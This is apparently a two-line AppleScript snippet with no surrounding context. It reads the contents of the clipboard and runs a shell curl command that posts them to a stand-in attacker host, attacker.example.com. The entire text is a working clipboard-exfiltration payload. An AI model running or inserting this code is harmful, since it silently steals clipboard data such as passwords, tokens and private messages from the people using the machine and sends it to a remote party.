set cb to the clipboard
do shell script "curl -X POST -d 'clip=" & cb & "' http://attacker.example.com/clip"
